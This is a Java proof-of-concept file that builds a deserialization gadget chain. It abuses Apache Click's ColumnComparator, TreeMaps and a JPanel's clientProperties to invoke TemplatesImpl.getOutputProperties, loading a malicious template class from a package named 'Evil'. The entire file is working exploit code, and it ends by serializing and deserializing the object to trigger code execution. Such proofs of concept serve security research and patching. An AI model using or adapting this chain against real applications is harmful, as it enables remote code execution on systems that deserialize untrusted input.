package com.example.Click;

import com.example.Evil.TemplateImplCalc;
import com.example.Utils.ReflectionUtil;
import com.example.Utils.SerializeUtil;
import com.example.Utils.Share;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xml.internal.utils.ObjectPool;
import org.apache.click.control.Column;
import org.apache.click.control.Table;

import javax.management.BadAttributeValueExpException;
import javax.swing.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.InvocationHandler;
import java.util.*;

public class POC_1 {

    /***
     * run with jComponent_equals.jar
     */

    public static void main(String[] args) throws Exception {
        TemplatesImpl templates = Share.getTemplatesImplObj();

        Column column = new Column("class");
        column.setTable(new Table());

        Comparator<?> comparator = (Comparator<?>) ReflectionUtil.createObject("org.apache.click.control.Column$ColumnComparator",
                new Class[]{Column.class},
                new Object[]{column});

        TreeMap treeMap1 = new TreeMap(comparator);
        treeMap1.put(templates, "aaa");
        TreeMap treeMap2 = new TreeMap(comparator);
        treeMap2.put(templates, "aaa");

        JPanel j = new JPanel();
        Class atClass = Class.forName("javax.swing.ArrayTable");
        Object arrayTable = ReflectionUtil.createWithoutConstructor(atClass);
        Object[] table = new Object[]{treeMap1, "1", treeMap2, "2"};

        ReflectionUtil.setField(arrayTable, "table", table);
        ReflectionUtil.setField(j, "clientProperties", arrayTable);
        ReflectionUtil.setField(column, "name", "outputProperties");
        SerializeUtil.deserialize(SerializeUtil.serialize(j));
    }

}
